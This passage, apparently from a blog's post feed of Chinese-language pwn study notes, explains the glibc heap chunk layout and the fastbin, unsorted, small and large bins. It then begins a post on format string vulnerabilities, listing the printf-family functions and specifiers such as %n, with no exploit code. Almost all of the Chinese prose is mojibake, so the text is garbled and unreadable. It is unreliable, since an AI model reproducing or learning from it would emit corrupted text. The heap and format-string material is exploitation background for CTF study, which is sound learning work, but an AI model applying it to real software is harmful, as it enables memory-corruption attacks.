class="line">&#125;;</span><br></pre></td></tr></table></figure><p>â€‹åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼ŒINTERNAL_SIZE_T çš„å¤§å°åœ¨ 64 ä½ç³»ç»Ÿä¸‹æ˜¯ 8 å­—èŠ‚ï¼Œ32 ä½ç³»ç»Ÿä¸‹æ˜¯ 4 å­—èŠ‚ã€‚ä»¥ä¸‹æ˜¯å…³äº malloc_chunk çš„å„ä¸ªæˆå‘˜çš„åŠŸèƒ½ï¼š</p><blockquote><ul><li><p><strong>prev_size</strong>, å¦‚æœè¯¥ chunk çš„ ** ç‰©ç†ç›¸é‚»çš„å‰ä¸€åœ°å€ chunkï¼ˆä¸¤ä¸ªæŒ‡é’ˆçš„åœ°å€å·®å€¼ä¸ºå‰ä¸€ chunk å¤§å°ï¼‰** æ˜¯ç©ºé—²çš„è¯ï¼Œé‚£è¯¥å­—æ®µè®°å½•çš„æ˜¯å‰ä¸€ä¸ª chunk çš„å¤§å° (åŒ…æ‹¬ chunk å¤´)ã€‚å¦åˆ™ï¼Œè¯¥å­—æ®µå¯ä»¥ç”¨æ¥å­˜å‚¨ç‰©ç†ç›¸é‚»çš„å‰ä¸€ä¸ª chunk çš„æ•°æ®ã€‚<strong>è¿™é‡Œçš„å‰ä¸€ chunk æŒ‡çš„æ˜¯è¾ƒä½åœ°å€çš„ chunk</strong> ã€‚</p></li><li><p>size</p><p>ï¼Œè¯¥ chunk çš„å¤§å°ï¼Œå¤§å°å¿…é¡»æ˜¯ 2 * SIZE_SZ çš„æ•´æ•°å€ã€‚å¦‚æœç”³è¯·çš„å†…å­˜å¤§å°ä¸æ˜¯ 2 * SIZE_SZ çš„æ•´æ•°å€ï¼Œä¼šè¢«è½¬æ¢æ»¡è¶³å¤§å°çš„æœ€å°çš„ 2 * SIZE_SZ çš„å€æ•°ã€‚32 ä½ç³»ç»Ÿä¸­ï¼ŒSIZE_SZ æ˜¯ 4ï¼›64 ä½ç³»ç»Ÿä¸­ï¼ŒSIZE_SZ æ˜¯ 8ã€‚ è¯¥å­—æ®µçš„ä½ä¸‰ä¸ªæ¯”ç‰¹ä½å¯¹ chunk çš„å¤§å°æ²¡æœ‰å½±å“ï¼Œå®ƒä»¬ä»é«˜åˆ°ä½åˆ†åˆ«è¡¨ç¤º</p><ul><li>NON_MAIN_ARENAï¼Œè®°å½•å½“å‰ chunk æ˜¯å¦ä¸å±äºä¸»çº¿ç¨‹ï¼Œ1 è¡¨ç¤ºä¸å±äºï¼Œ0 è¡¨ç¤ºå±äºã€‚</li><li>IS_MAPPEDï¼Œè®°å½•å½“å‰ chunk æ˜¯å¦æ˜¯ç”± mmap åˆ†é…çš„ã€‚</li><li>PREV_INUSEï¼Œè®°å½•å‰ä¸€ä¸ª chunk å—æ˜¯å¦è¢«åˆ†é…ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œå †ä¸­ç¬¬ä¸€ä¸ªè¢«åˆ†é…çš„å†…å­˜å—çš„ size å­—æ®µçš„ P ä½éƒ½ä¼šè¢«è®¾ç½®ä¸º 1ï¼Œä»¥ä¾¿äºé˜²æ­¢è®¿é—®å‰é¢çš„éæ³•å†…å­˜ã€‚å½“ä¸€ä¸ª chunk çš„ size çš„ P ä½ä¸º 0 æ—¶ï¼Œæˆ‘ä»¬èƒ½é€šè¿‡ prev_size å­—æ®µæ¥è·å–ä¸Šä¸€ä¸ª chunk çš„å¤§å°ä»¥åŠåœ°å€ã€‚è¿™ä¹Ÿæ–¹ä¾¿è¿›è¡Œç©ºé—² chunk ä¹‹é—´çš„åˆå¹¶ã€‚</li></ul></li><li><p>fdï¼Œbk</p><p>ã€‚ chunk å¤„äºåˆ†é…çŠ¶æ€æ—¶ï¼Œä» fd å­—æ®µå¼€å§‹æ˜¯ç”¨æˆ·çš„æ•°æ®ã€‚chunk ç©ºé—²æ—¶ï¼Œä¼šè¢«æ·»åŠ åˆ°å¯¹åº”çš„ç©ºé—²ç®¡ç†é“¾è¡¨ä¸­ï¼Œå…¶å­—æ®µçš„å«ä¹‰å¦‚ä¸‹</p><ul><li>fd æŒ‡å‘ä¸‹ä¸€ä¸ªï¼ˆéç‰©ç†ç›¸é‚»ï¼‰ç©ºé—²çš„ chunk</li><li>bk æŒ‡å‘ä¸Šä¸€ä¸ªï¼ˆéç‰©ç†ç›¸é‚»ï¼‰ç©ºé—²çš„ chunk</li><li>é€šè¿‡ fd å’Œ bk å¯ä»¥å°†ç©ºé—²çš„ chunk å—åŠ å…¥åˆ°ç©ºé—²çš„ chunk å—é“¾è¡¨è¿›è¡Œç»Ÿä¸€ç®¡ç†</li></ul></li><li><p>fd_nextsizeï¼Œ bk_nextsize</p><p>ï¼Œä¹Ÿæ˜¯åªæœ‰ chunk ç©ºé—²çš„æ—¶å€™æ‰ä½¿ç”¨ï¼Œä¸è¿‡å…¶ç”¨äºè¾ƒå¤§çš„ chunkï¼ˆlarge chunkï¼‰ã€‚</p><ul><li>fd_nextsize æŒ‡å‘å‰ä¸€ä¸ªä¸å½“å‰ chunk å¤§å°ä¸åŒçš„ç¬¬ä¸€ä¸ªç©ºé—²å—ï¼Œä¸åŒ…å« bin çš„å¤´æŒ‡é’ˆã€‚</li><li>bk_nextsize æŒ‡å‘åä¸€ä¸ªä¸å½“å‰ chunk å¤§å°ä¸åŒçš„ç¬¬ä¸€ä¸ªç©ºé—²å—ï¼Œä¸åŒ…å« bin çš„å¤´æŒ‡é’ˆã€‚</li><li>ä¸€èˆ¬ç©ºé—²çš„ large chunk åœ¨ fd çš„éå†é¡ºåºä¸­ï¼ŒæŒ‰ç…§ç”±å¤§åˆ°å°çš„é¡ºåºæ’åˆ—ã€‚<strong>è¿™æ ·åšå¯ä»¥é¿å…åœ¨å¯»æ‰¾åˆé€‚ chunk æ—¶æŒ¨ä¸ªéå†ã€‚</strong></li></ul></li></ul></blockquote><p>â€‹ä¸€ä¸ªå·²ç»åˆ†é…çš„ chunk çš„æ ·å­å¦‚ä¸‹ã€‚<strong>æˆ‘ä»¬ç§°å‰ä¸¤ä¸ªå­—æ®µç§°ä¸º chunk headerï¼Œåé¢çš„éƒ¨åˆ†ç§°ä¸º user dataã€‚æ¯æ¬¡ malloc ç”³è¯·å¾—åˆ°çš„å†…å­˜æŒ‡é’ˆï¼Œå…¶å®æŒ‡å‘ user data çš„èµ·å§‹å¤„ï¼Œä¹Ÿå°±æ˜¯ mem å¤„çš„åœ°å€ã€‚</strong></p><p>â€‹å½“ä¸€ä¸ª chunk å¤„äºä½¿ç”¨çŠ¶æ€æ—¶ï¼Œå®ƒçš„ä¸‹ä¸€ä¸ª chunk çš„ prev_size åŸŸæ— æ•ˆï¼Œæ‰€ä»¥ä¸‹ä¸€ä¸ª chunk çš„è¯¥éƒ¨åˆ†ä¹Ÿå¯ä»¥è¢«å½“å‰ chunk ä½¿ç”¨ã€‚<strong>è¿™å°±æ˜¯ chunk ä¸­çš„ç©ºé—´å¤ç”¨ã€‚</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of previous chunk, <span class="keyword">if</span> <span class="title function_">unallocated</span> <span class="params">(P clear)</span>  |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of chunk, in bytes                     |A|M|P|</span><br><span class="line">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             User data starts here...                          .</span><br><span class="line">        .                                                               .</span><br><span class="line">        .             <span class="params">(malloc_usable_size() bytes)</span>                      .</span><br><span class="line">next    .                                                               |</span><br><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             <span class="params">(size of chunk, but used <span class="keyword">for</span> application data)</span>    |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of next chunk, in bytes                |A|0|1|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure><p>â€‹è¢«é‡Šæ”¾çš„ chunk è¢«è®°å½•åœ¨é“¾è¡¨ä¸­ï¼ˆå¯èƒ½æ˜¯å¾ªç¯åŒå‘é“¾è¡¨ï¼Œä¹Ÿå¯èƒ½æ˜¯å•å‘é“¾è¡¨ï¼‰ã€‚å…·ä½“ç»“æ„å¦‚ä¸‹:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of previous chunk, <span class="keyword">if</span> <span class="title function_">unallocated</span> <span class="params">(P clear)</span>  |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">`head:&#x27; |             Size of chunk, in bytes                     |A|0|P|</span><br><span class="line">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Forward pointer to next chunk in <span class="built_in">list</span>             |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Back pointer to previous chunk in <span class="built_in">list</span>            |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Unused <span class="title function_">space</span> <span class="params">(may be <span class="number">0</span> bytes <span class="type">long</span>)</span>                .</span><br><span class="line">        .                                                               .</span><br><span class="line"> next   .                                                               |</span><br><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">`foot:&#x27; |             Size of chunk, in bytes                           |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of next chunk, in bytes                |A|0|0|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure><h2 id="3å„ç±»binä»‹ç»"><a class="markdownIt-Anchor" href="#3å„ç±»binä»‹ç»">#</a> 3. å„ç±» bin ä»‹ç»ï¼š</h2><p>â€‹chunk è¢«é‡Šæ”¾æ—¶ï¼Œglibc ä¼šå°†å®ƒä»¬é‡æ–°ç»„ç»‡èµ·æ¥ï¼Œæ„æˆä¸åŒçš„ bin é“¾è¡¨ï¼Œå½“ç”¨æˆ·å†æ¬¡ç”³è¯·æ—¶ï¼Œå°±ä»ä¸­å¯»æ‰¾åˆé€‚çš„ chunk è¿”å›ç”¨æˆ·ã€‚ä¸åŒå¤§å°åŒºé—´ chunk è¢«åˆ’åˆ†åˆ°ä¸åŒçš„ bin ä¸­ï¼Œå†åŠ ä¸Šä¸€ç§ç‰¹æ®Šçš„ binï¼Œä¸€å…±æœ‰å››ç§ï¼šFast bin ã€Samll bin ã€ Large bin ã€å’Œ Unsorted bin ã€‚è¿™äº› bin è®°å½•åœ¨ malloc_state ç»“æ„ä¸­ã€‚</p><ul><li>fastbinsY ï¼šè¿™æ˜¯ä¸€ä¸ª bin æ•°ç»„ï¼Œé‡Œé¢æœ‰ NFASTBINS ä¸ª fast binã€‚</li><li>binsï¼šä¹Ÿæ˜¯ä¸€ä¸ª bin æ•°ç»„ï¼Œä¸€å…±æœ‰ 126 ä¸ª bin ï¼ŒæŒ‰é¡ºåºåˆ†åˆ«æ˜¯ï¼š<ul><li>bin 1 ä¸º unsorted bin</li><li>bin 2 åˆ° bin 63 ä¸º small bin</li><li>bin 64 åˆ° bin 126 ä¸º large bin</li></ul></li></ul><h3 id="fast-bin"><a class="markdownIt-Anchor" href="#fast-bin">#</a> fast bin ï¼š</h3><p>â€‹åœ¨å®è·µä¸­ï¼Œç¨‹åºç”³è¯·å’Œé‡Šæ”¾çš„å †å—å¾€å¾€éƒ½æ¯”è¾ƒå°ï¼Œæ‰€ä»¥ glibc å¯¹è¿™ç±» bin ä½¿ç”¨å•é“¾è¡¨ç»“æ„ï¼Œå¹¶é‡‡ç”¨ LIFOï¼ˆåè¿›å…ˆå‡ºï¼‰çš„åˆ†é…ç­–ç•¥ã€‚ä¸ºäº†åŠ å¿«é€Ÿåº¦ï¼Œfast bin é‡Œçš„ chunk ä¸ä¼šè¿›è¡Œåˆå¹¶æ“ä½œï¼Œæ‰€ä»¥ä¸‹ä¸€ä¸ª chunk çš„ PRV_INUSE å§‹ç»ˆæ ‡è®°ä¸º 1ï¼Œä½¿å…¶å¤„äºä½¿ç”¨çŠ¶æ€ã€‚åŒä¸€ä¸ª fast bin é‡Œ chunk å¤§å°ç›¸åŒï¼Œå¹¶ä¸”åœ¨ fastbinY æ•°ç»„é‡ŒæŒ‰ç…§ä»å°åˆ°å¤§çš„é¡ºåºæ’åˆ—ï¼Œåºå·ä¸º 0 çš„ fast bin ä¸­å®¹çº³çš„ chunk å¤§å°ä¸º 4<em>SIZE_SZ å­—èŠ‚ï¼Œéšç€åºå·å¢åŠ ï¼Œæ‰€å®¹çº³çš„ chunk é€’å¢ 2</em>SIZE_SZ å­—èŠ‚ã€‚</p><p><img data-src="https://img-blog.csdnimg.cn/direct/08dc51489bb7469c8a03c0f73de586bb.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="unsorted-bin"><a class="markdownIt-Anchor" href="#unsorted-bin">#</a> unsorted binï¼š</h3><p>â€‹ä¸€å®šå¤§å°çš„ chunk è¢«é‡Šæ”¾æ—¶ï¼Œåœ¨è¿›å…¥ small bin æˆ–è€… large bin ä¹‹å‰ï¼Œä¼šå…ˆåŠ å…¥ unsorted bin ã€‚åœ¨å®è·µä¸­ï¼Œä¸€ä¸ªé‡Šæ”¾çš„ chunk å¸¸å¸¸å¾ˆå¿«å°±ä¼šè¢«é‡æ–°ä½¿ç”¨ï¼Œæ‰€ä»¥å°†å…¶å…ˆåŠ å…¥ unsorted bin å¯ä»¥åŠ å¿«åˆ†é…çš„é€Ÿåº¦ã€‚ unsorted bin ä½¿ç”¨åŒé“¾è¡¨ç»“æ„ï¼Œå¹¶é‡‡ç”¨ FIFOï¼ˆå…ˆè¿›å…ˆå‡ºï¼‰çš„åˆ†é…ç­–ç•¥ã€‚ä¸ fastbinY ä¸åŒï¼Œunsorted bin ä¸­çš„ chunk å¤§å°å¯èƒ½æ˜¯ä¸åŒçš„ï¼Œå¹¶ä¸”ç”±äºæ˜¯åŒå‘é“¾è¡¨ç»“æ„ï¼Œä¸€ä¸ª bin ä¼šå ç”¨ bins çš„ä¸¤ä¸ªå…ƒç´ ã€‚</p><h3 id="small-bin"><a class="markdownIt-Anchor" href="#small-bin">#</a> small binï¼š</h3><p>â€‹åŒä¸€ä¸ª small bin é‡Œ chunk çš„å¤§å°ç›¸åŒï¼Œé‡‡ç”¨åŒé“¾è¡¨ç»“æ„ï¼Œä½¿ç”¨é¢‘ç‡ä»‹äº fast bin å’Œ large bin ä¹‹é—´ã€‚small bin åœ¨ bins é‡Œå±…ç¬¬ 2 åˆ° 63 ä½ï¼Œå…± 62 ä¸ªã€‚æ ¹æ®æ’åºï¼Œæ¯ä¸ª small bin çš„å¤§å°ä¸º 2<em>SIZE_SZ</em>inxï¼ˆidx è¡¨ç¤º bins æ•°ç»„çš„ä¸‹æ ‡ï¼‰ã€‚åœ¨ 64 ä½ç³»ç»Ÿä¸‹ï¼Œæœ€å°çš„ small chunk ä¸º 2*8*2=32 å­—èŠ‚ï¼Œæœ€å¤§çš„ small chunk ä¸º 2*8*63=1008 å­—èŠ‚ã€‚ç”±äº small bin å’Œ fast bin æœ‰é‡åˆçš„éƒ¨åˆ†ï¼Œæ‰€ä»¥è¿™äº› chunk åœ¨æŸäº›æƒ…å†µä¸‹ä¼šè¢«åŠ å…¥ small bin ä¸­ã€‚</p><h3 id="large-bin"><a class="markdownIt-Anchor" href="#large-bin">#</a> large binï¼š</h3><p>â€‹large bin åœ¨ bins é‡Œå±… 64 åˆ° 126 ä½ï¼Œå…± 63 ä¸ªï¼Œè¢«åˆ†æˆäº† 6 ç»„ï¼Œæ¯ç»„ bin æ‰€èƒ½å®¹çº³çš„ chunk æŒ‰é¡ºåºæ’æˆç­‰å·®æ•°åˆ—ï¼Œå…¬å·®åˆ†åˆ«å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">32 bins of size64</span><br><span class="line">16 bins of size   512</span><br><span class="line"> 8 bins of size  4096</span><br><span class="line"> 4 bins of size 32768</span><br><span class="line"> 2 bins of size262144</span><br><span class="line"> 1 bin  of sizewhat&#x27;sleft</span><br></pre></td></tr></table></figure><p>â€‹32 ä½ç³»ç»Ÿä¸‹ç¬¬ä¸€ä¸ª large bin çš„ chunk æœ€å°ä¸º 512 å­—èŠ‚ï¼Œç¬¬äºŒä¸ª large bin çš„é¢ chunk æœ€å°ä¸º 512+64 å­—èŠ‚ï¼ˆå¤„äº [512ï¼Œ512+64] ä¹‹é—´çš„ chunk éƒ½å±äºç¬¬ä¸€ä¸ª large binï¼‰ï¼Œä»¥æ­¤ç±»æ¨ã€‚64 ä½ç³»ç»Ÿä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œç¬¬ä¸€ä¸ª large bin çš„ chunk æœ€å°ä¸º 1024 å­—èŠ‚ï¼Œç¬¬äºŒä¸ª large bin çš„ chunk æœ€å°ä¸º 1024+64 å­—èŠ‚ï¼ˆå¤„äº [1024ï¼Œ1024+64] ä¹‹é—´çš„ chunk éƒ½å±äºç¬¬ä¸€ä¸ª large binï¼‰ä»¥æ­¤ç±»æ¨ã€‚</p><p>â€‹large bin ä¹Ÿæ˜¯é‡‡ç”¨åŒé“¾è¡¨ç»“æ„ï¼Œé‡Œé¢çš„ chunk ä»å¤´èŠ‚ç‚¹çš„ fd æŒ‡é’ˆå¼€å§‹ï¼ŒæŒ‰å¤§å°é¡ºåºè¿›è¡Œæ’åˆ—ã€‚ä¸ºäº†åŠ å¿«æ£€ç´¢é€Ÿåº¦ï¼Œfd_nextsize å’Œ bk_nextsize æŒ‡é’ˆç”¨äºæŒ‡å‘ç¬¬ä¸€ä¸ªä¸è‡ªå·±å¤§å°ä¸åŒçš„ chunk æ—¶ï¼Œæ‰€ä»¥ä¹Ÿåªæœ‰åœ¨åŠ å…¥äº†å¤§å°ä¸åŒçš„ chunk æ—¶ï¼Œè¿™ä¸¤ä¸ªæŒ‡é’ˆæ‰ä¼šè¢«ä¿®æ”¹ã€‚</p><h2 id="å‚è€ƒèµ„æ–™"><a class="markdownIt-Anchor" href="#å‚è€ƒèµ„æ–™">#</a> å‚è€ƒèµ„æ–™ï¼š</h2><p>â€‹ã€ŠCTF ç«èµ›æƒå¨æŒ‡å— pwn ç¯‡ã€‹</p>]]></content>
      
      
      <categories>
          
          <category> Pwnæ‰‹çš„è‡ªæˆ‘ä¿®å…» </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnå­¦ä¹ ç¬”è®°ï¼ˆ5ï¼‰--æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼ˆæœªå®Œå…¨å®Œæˆï¼‰</title>
      <link href="/posts/a698ff8.html"/>
      <url>/posts/a698ff8.html</url>
      
        <content type="html"><![CDATA[<h1 id="pwnå­¦ä¹ ç¬”è®°5æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"><a class="markdownIt-Anchor" href="#pwnå­¦ä¹ ç¬”è®°5æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´">#</a> pwn å­¦ä¹ ç¬”è®°ï¼ˆ5ï¼‰â€“æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</h1><p>â€‹<strong>å‰è¨€ï¼šç”±äºæ¡ä»¶æœ‰é™ï¼Œå› æ­¤å¯¹äºè¯¥æ¼æ´çš„å­¦ä¹ ä¸ç®—å¾ˆå¤šï¼Œ</strong></p><h2 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åŸºç¡€"><a class="markdownIt-Anchor" href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åŸºç¡€">#</a> æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åŸºç¡€ï¼š</h2><h3 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²ä»‹ç»"><a class="markdownIt-Anchor" href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²ä»‹ç»">#</a> æ ¼å¼åŒ–å­—ç¬¦ä¸²ä»‹ç»ï¼š</h3><p>â€‹æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°å¯ä»¥æ¥æ”¶å¯å˜æ•°é‡çš„å‚æ•°ï¼Œå¹¶å°†<strong>ç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œæ ¹æ®å…¶æ¥è§£æä¹‹åçš„å‚æ•°</strong>ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åˆ©ç”¨ä¸€èˆ¬åˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†ï¼š</p><blockquote><ul><li>æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°</li><li>æ ¼å¼åŒ–å­—ç¬¦ä¸²</li><li>[åç»­å‚æ•°]</li></ul></blockquote><h3 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°"><a class="markdownIt-Anchor" href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°">#</a> æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°ï¼š</h3><p>â€‹å¸¸è§çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æœ‰ï¼š</p><blockquote><p>è¾“å…¥ï¼š</p><ul><li>scanf()</li></ul></blockquote><blockquote><p>è¾“å‡ºï¼š</p><table><thead><tr><th style="text-align:center">å‡½æ•°</th><th style="text-align:center">åŸºæœ¬ä»‹ç»</th></tr></thead><tbody><tr><td style="text-align:center">printf</td><td style="text-align:center">è¾“å‡ºåˆ° stdout</td></tr><tr><td style="text-align:center">fprintf</td><td style="text-align:center">è¾“å‡ºåˆ°æŒ‡å®š FILE æµ</td></tr><tr><td style="text-align:center">vprintf</td><td style="text-align:center">æ ¹æ®å‚æ•°åˆ—è¡¨æ ¼å¼åŒ–è¾“å‡ºåˆ° stdout</td></tr><tr><td style="text-align:center">vfprintf</td><td style="text-align:center">æ ¹æ®å‚æ•°åˆ—è¡¨æ ¼å¼åŒ–è¾“å‡ºåˆ°æŒ‡å®š FILE æµ</td></tr><tr><td style="text-align:center">sprintf</td><td style="text-align:center">è¾“å‡ºåˆ°å­—ç¬¦ä¸²</td></tr><tr><td style="text-align:center">snprintf</td><td style="text-align:center">è¾“å‡ºæŒ‡å®šå­—èŠ‚æ•°åˆ°å­—ç¬¦ä¸²</td></tr><tr><td style="text-align:center">vsprintf</td><td style="text-align:center">æ ¹æ®å‚æ•°åˆ—è¡¨æ ¼å¼åŒ–è¾“å‡ºåˆ°å­—ç¬¦ä¸²</td></tr><tr><td style="text-align:center">vsnprintf</td><td style="text-align:center">æ ¹æ®å‚æ•°åˆ—è¡¨æ ¼å¼åŒ–è¾“å‡ºæŒ‡å®šå­—èŠ‚åˆ°å­—ç¬¦ä¸²</td></tr><tr><td style="text-align:center">setproctitle</td><td style="text-align:center">è®¾ç½® argv</td></tr><tr><td style="text-align:center">syslog</td><td style="text-align:center">è¾“å‡ºæ—¥å¿—</td></tr></tbody></table></blockquote><h3 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æ ¼å¼"><a class="markdownIt-Anchor" href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æ ¼å¼">#</a> æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æ ¼å¼ï¼š</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%[parameter][flags][field width][.precision][length]type</span><br></pre></td></tr></table></figure><p>â€‹å…¶ä¸­ï¼Œéœ€è¦æ³¨æ„çš„æœ‰ parameter å‚æ•°ï¼Œä»¥åŠ type å‚æ•°ï¼š</p><blockquote><p>parameterï¼š</p><pre><code>  n$ï¼Œè·å–æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸­çš„æŒ‡å®šå‚æ•°</code></pre></blockquote><blockquote><p>typeï¼š</p><ul><li>d/iï¼Œæœ‰ç¬¦å·æ•´æ•°</li><li>uï¼Œæ— ç¬¦å·æ•´æ•°</li><li>x/Xï¼Œ16 è¿›åˆ¶ unsigned int ã€‚x ä½¿ç”¨å°å†™å­—æ¯ï¼›X ä½¿ç”¨å¤§å†™å­—æ¯ã€‚å¦‚æœæŒ‡å®šäº†ç²¾åº¦ï¼Œåˆ™è¾“å‡ºçš„æ•°å­—ä¸è¶³æ—¶åœ¨å·¦ä¾§è¡¥ 0ã€‚é»˜è®¤ç²¾åº¦ä¸º 1ã€‚ç²¾åº¦ä¸º 0 ä¸”å€¼ä¸º 0ï¼Œåˆ™è¾“å‡ºä¸ºç©ºã€‚</li><li>oï¼Œ8 è¿›åˆ¶ unsigned int ã€‚å¦‚æœæŒ‡å®šäº†ç²¾åº¦ï¼Œåˆ™è¾“å‡ºçš„æ•°å­—ä¸è¶³æ—¶åœ¨å·¦ä¾§è¡¥ 0ã€‚é»˜è®¤ç²¾åº¦ä¸º 1ã€‚ç²¾åº¦ä¸º 0 ä¸”å€¼ä¸º 0ï¼Œåˆ™è¾“å‡ºä¸ºç©ºã€‚</li><li>sï¼Œå¦‚æœæ²¡æœ‰ç”¨ l æ ‡å¿—ï¼Œè¾“å‡º null ç»“å°¾å­—ç¬¦ä¸²ç›´åˆ°ç²¾åº¦è§„å®šçš„ä¸Šé™ï¼›å¦‚æœæ²¡æœ‰æŒ‡å®šç²¾åº¦ï¼Œåˆ™è¾“å‡ºæ‰€æœ‰å­—èŠ‚ã€‚å¦‚æœç”¨äº† l æ ‡å¿—ï¼Œåˆ™å¯¹åº”å‡½æ•°å‚æ•°æŒ‡å‘ wchar_t å‹çš„æ•°ç»„ï¼Œè¾“å‡ºæ—¶æŠŠæ¯ä¸ªå®½å­—ç¬¦è½¬åŒ–ä¸ºå¤šå­—èŠ‚å­—ç¬¦ï¼Œç›¸å½“äºè°ƒç”¨ wcrtomb å‡½æ•°ã€‚</li><li>cï¼Œå¦‚æœæ²¡æœ‰ç”¨ l æ ‡å¿—ï¼ŒæŠŠ int å‚æ•°è½¬ä¸º unsigned char å‹è¾“å‡ºï¼›å¦‚æœç”¨äº† l æ ‡å¿—ï¼ŒæŠŠ wint_t å‚æ•°è½¬ä¸ºåŒ…å«ä¸¤ä¸ªå…ƒç´ çš„ wchart_t æ•°ç»„ï¼Œå…¶ä¸­ç¬¬ä¸€ä¸ªå…ƒç´ åŒ…å«è¦è¾“å‡ºçš„å­—ç¬¦ï¼Œç¬¬äºŒä¸ªå…ƒç´ ä¸º null å®½å­—ç¬¦ã€‚</li><li>pï¼Œ void * å‹ï¼Œè¾“å‡ºå¯¹åº”å˜é‡çš„å€¼ã€‚printf (&quot;% p&quot;,a) ç”¨åœ°å€çš„æ ¼å¼æ‰“å°å˜é‡ a çš„å€¼ï¼Œprintf (&quot;% p&quot;, &amp;a) æ‰“å°å˜é‡ a æ‰€åœ¨çš„åœ°å€ã€‚</li><li>nï¼Œä¸è¾“å‡ºå­—ç¬¦ï¼Œä½†æ˜¯æŠŠå·²ç»æˆåŠŸè¾“å‡ºçš„å­—ç¬¦ä¸ªæ•°å†™å…¥å¯¹åº”çš„æ•´å‹æŒ‡é’ˆå‚æ•°æ‰€æŒ‡çš„å˜é‡ã€‚</li><li>%ï¼Œ ' <code>%</code> ' å­—é¢å€¼ï¼Œä¸æ¥å—ä»»ä½• flags, 